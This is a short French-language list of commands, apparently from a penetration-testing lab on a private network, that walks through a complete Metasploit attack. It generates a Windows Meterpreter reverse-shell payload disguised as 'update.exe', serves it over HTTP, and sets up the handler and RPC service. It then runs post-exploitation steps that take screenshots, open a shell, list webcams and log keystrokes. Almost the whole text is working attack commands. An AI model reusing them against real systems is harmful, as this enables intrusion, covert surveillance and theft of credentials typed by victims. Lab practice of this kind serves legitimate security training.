## Commandes utilisées

```bash
# Reconnaissance
ip a
ping -c 5 192.168.106.133

# Génération du payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.106.128 LPORT=4444 -f exe -o /tmp/update.exe

# Livraison via serveur HTTP
cd /tmp
python3 -m http.server 8080

# Configuration Metasploit RPC
msfrpcd -U admin -P [REDACTED] -S -a 0.0.0.0
msfconsole
load msgrpc User=msf Pass=[REDACTED] ServerHost=localhost ServerPort=55553

# Configuration du handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.106.128
set LPORT 4444
exploit -j -z

# Post-exploitation
sysinfo
getuid
screenshot
shell
webcam_list
keyscan_start
keyscan_dump
keyscan_stop
```
